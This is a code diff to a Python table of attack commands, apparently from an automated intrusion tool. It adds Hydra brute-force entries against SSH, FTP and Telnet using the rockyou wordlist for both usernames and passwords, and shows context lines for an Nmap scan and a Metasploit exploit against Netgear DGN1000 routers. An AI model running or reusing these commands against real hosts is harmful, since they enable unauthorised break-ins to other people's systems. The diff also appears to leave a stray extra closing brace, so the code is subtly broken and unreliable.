@@ -15,10 +15,21 @@ tool_patterns = {
         "service": None,
         "description": "Nmap version scan to detect open services and versions."
     },
-    "hydra": {
-        "command": ["hydra", "-l", "admin", "-P", "/usr/share/wordlists/rockyou.txt", "ssh://{ip}"],
+    "hydra_ssh": {
+        "command": ["hydra", "-L", "/usr/share/wordlists/rockyou.txt", "-P", "/usr/share/wordlists/rockyou.txt", "ssh://{ip}"],
         "service": "ssh",
-        "description": "Hydra brute-force attack against SSH service."
+        "description": "Hydra brute-force attack against SSH using rockyou for both username and password."
+    },
+    "hydra_ftp": {
+        "command": ["hydra", "-L", "/usr/share/wordlists/rockyou.txt", "-P", "/usr/share/wordlists/rockyou.txt", "ftp://{ip}"],
+        "service": "ftp",
+        "description": "Hydra brute-force attack against FTP service using rockyou for both username and password."
+    },
+    "hydra_telnet": {
+        "command": ["hydra", "-L", "/usr/share/wordlists/rockyou.txt", "-P", "/usr/share/wordlists/rockyou.txt", "telnet://{ip}"],
+        "service": "telnet",
+        "description": "Hydra brute-force attack against Telnet using rockyou for both username and password."
+    },
     },
     "msfconsole": {
         "command": ["msfconsole", "-q", "-x", "use exploit/linux/http/netgear_dgn1000_setup_exec; set RHOSTS {ip}; exploit; exit"],
